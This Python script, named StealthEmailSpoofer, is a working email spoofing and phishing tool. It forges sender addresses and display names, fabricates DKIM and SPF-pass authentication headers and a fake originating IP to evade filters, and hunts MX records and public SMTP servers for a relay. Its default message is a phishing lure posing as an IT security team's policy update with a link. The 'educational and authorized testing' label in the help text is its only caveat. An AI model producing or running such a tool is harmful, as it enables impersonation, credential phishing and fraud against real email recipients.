import smtplib
import random
import time
import dns.resolver
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
import argparse
import socket
import ssl
import re
import os

class StealthEmailSpoofer:
    def __init__(self):
        self.smtp_servers = [
            ("smtp.gmail.com", 587),
            ("smtp.office365.com", 587),
            ("smtp.mail.yahoo.com", 587),
            ("smtp.aol.com", 587),
            ("smtp-mail.outlook.com", 587)
        ]
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
        ]
        
    def get_mx_records(self, domain):
        """Get MX records for a domain to find its mail server"""
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            return sorted([(record.preference, str(record.exchange)) for record in mx_records])
        except:
            return None

    def validate_email(self, email):
        """Simple email validation"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None

    def generate_message_id(self, domain):
        """Generate a realistic message ID"""
        import uuid
        return f"<{uuid.uuid4().hex}@{domain}>"

    def create_stealth_headers(self, spoofed_from, target_email):
        """Add various headers to make the email look legitimate"""
        domain = spoofed_from.split('@')[-1]
        
        headers = {
            'Message-ID': self.generate_message_id(domain),
            'X-Mailer': random.choice(self.user_agents),
            'X-Priority': '3',
            'X-MSMail-Priority': 'Normal',
            'X-Originating-IP': f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}",
            'Return-Path': f"<{spoofed_from}>",
            'DKIM-Signature': f'v=1; a=rsa-sha256; d={domain}; s=selector1;',
            'Authentication-Results': f'{domain}; spf=pass smtp.mailfrom={spoofed_from}'
        }
        
        return headers

    def create_html_version(self, plain_text):
        """Create HTML version of the email"""
        html_content = f"""
        <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        </head>
        <body>
            <div style="font-family: Arial, sans-serif; font-size: 14px; color: #333;">
            {plain_text.replace('\n', '<br>')}
            </div>
        </body>
        </html>
        """
        return html_content

    def find_working_smtp_server(self, spoofed_domain):
        """Try to find a working SMTP server for the spoofed domain"""
        # First try to get MX records for the domain
        mx_records = self.get_mx_records(spoofed_domain)
        servers_to_try = []
        
        if mx_records:
            for preference, server in mx_records:
                servers_to_try.append((server, 25))
                servers_to_try.append((server, 587))
                servers_to_try.append((server, 465))
        
        # Add common SMTP servers
        servers_to_try.extend(self.smtp_servers)
        
        # Try each server
        for server, port in servers_to_try:
            try:
                print(f"[*] Testing {server}:{port}")
                smtp = smtplib.SMTP(server, port, timeout=10)
                smtp.ehlo()
                if port == 587:
                    smtp.starttls()
                    smtp.ehlo()
                smtp.quit()
                print(f"[+] Found working server: {server}:{port}")
                return server, port
            except (smtplib.SMTPException, socket.error, socket.timeout, ConnectionRefusedError, ssl.SSLError) as e:
                print(f"[-] {server}:{port} failed: {str(e)}")
                continue
        
        return None, None

    def send_spoofed_email(self, target_email, spoofed_from, spoofed_name, subject, 
                          message_body, smtp_server=None, smtp_port=None, 
                          delay=0, retries=3, use_html=False):
        
        # Validate emails
        if not self.validate_email(target_email):
            print(f"[-] Invalid target email: {target_email}")
            return False
            
        if not self.validate_email(spoofed_from):
            print(f"[-] Invalid spoofed email: {spoofed_from}")
            return False
        
        # Find SMTP server if not provided
        if not smtp_server:
            spoofed_domain = spoofed_from.split('@')[-1]
            smtp_server, smtp_port = self.find_working_smtp_server(spoofed_domain)
            if not smtp_server:
                print("[-] Could not find a working SMTP server")
                return False
        
        # Create message
        msg = MIMEMultipart('alternative')
        msg['From'] = f'{spoofed_name} <{spoofed_from}>'
        msg['To'] = target_email
        msg['Subject'] = Header(subject, 'utf-8')
        
        # Add stealth headers
        stealth_headers = self.create_stealth_headers(spoofed_from, target_email)
        for key, value in stealth_headers.items():
            msg[key] = value
        
        # Create plain text part
        part1 = MIMEText(message_body, 'plain', 'utf-8')
        msg.attach(part1)
        
        # Create HTML part if requested
        if use_html:
            html_content = self.create_html_version(message_body)
            part2 = MIMEText(html_content, 'html', 'utf-8')
            msg.attach(part2)
        
        # Add delay if specified
        if delay > 0:
            print(f"[*] Waiting for {delay} seconds before sending...")
            time.sleep(delay)
        
        # Try to send with retries
        for attempt in range(retries):
            try:
                print(f"[*] Attempt {attempt + 1} of {retries} to send email")
                
                server = smtplib.SMTP(smtp_server, smtp_port, timeout=30)
                server.ehlo()
                
                # Try to start TLS if available
                try:
                    if smtp_port == 587:
                        server.starttls()
                        server.ehlo()
                except:
                    print("[!] TLS not supported, continuing without encryption")
                
                # Send the email
                text = msg.as_string()
                server.sendmail(spoofed_from, target_email, text)
                server.quit()
                
                print(f"[+] Email successfully sent to {target_email} spoofing {spoofed_from}")
                return True
                
            except Exception as e:
                print(f"[-] Attempt {attempt + 1} failed: {str(e)}")
                if attempt < retries - 1:
                    wait_time = (attempt + 1) * 5  # Exponential backoff
                    print(f"[*] Waiting {wait_time} seconds before retry...")
                    time.sleep(wait_time)
                else:
                    print("[-] All attempts failed")
                    return False

def main():
    parser = argparse.ArgumentParser(description='Advanced Email Spoofing Tool (For Educational and Authorized Testing Only)')
    parser.add_argument('target', help='Target email address')
    parser.add_argument('spoofed', help='Spoofed FROM email address')
    parser.add_argument('--name', default='CEO', help='Spoofed display name')
    parser.add_argument('--subject', default='Urgent: Security Policy Update', help='Email subject')
    parser.add_argument('--body', help='Email body text (optional)')
    parser.add_argument('--body-file', help='File containing email body (optional)')
    parser.add_argument('--server', help='SMTP server hostname (optional)')
    parser.add_argument('--port', type=int, help='SMTP server port (optional)')
    parser.add_argument('--delay', type=int, default=0, help='Delay in seconds before sending')
    parser.add_argument('--retries', type=int, default=3, help='Number of retry attempts')
    parser.add_argument('--html', action='store_true', help='Include HTML version of email')
    parser.add_argument('--auto-server', action='store_true', help='Automatically find SMTP server for spoofed domain')
    
    args = parser.parse_args()
    
    # Read message body from file or use default
    if args.body_file:
        if os.path.exists(args.body_file):
            with open(args.body_file, 'r', encoding='utf-8') as f:
                message_body = f.read()
        else:
            print(f"[-] File not found: {args.body_file}")
            return
    elif args.body:
        message_body = args.body
    else:
        # Default message
        message_body = """Hello,

Please review the updated security policy document at your earliest convenience.

We've made several important changes that affect all employees, particularly regarding password management and remote access protocols.

You can access the document here: http://company-portal.com/security-update

Best regards,
IT Security Team"""
    
    spoofer = StealthEmailSpoofer()
    
    # Use auto-server discovery if requested
    smtp_server = args.server
    smtp_port = args.port
    
    if args.auto_server and not args.server:
        spoofed_domain = args.spoofed.split('@')[-1]
        smtp_server, smtp_port = spoofer.find_working_smtp_server(spoofed_domain)
        if not smtp_server:
            print("[-] Could not find a working SMTP server automatically")
            return
    
    spoofer.send_spoofed_email(
        target_email=args.target,
        spoofed_from=args.spoofed,
        spoofed_name=args.name,
        subject=args.subject,
        message_body=message_body,
        smtp_server=smtp_server,
        smtp_port=smtp_port,
        delay=args.delay,
        retries=args.retries,
        use_html=args.html
    )

if __name__ == "__main__":
    main()
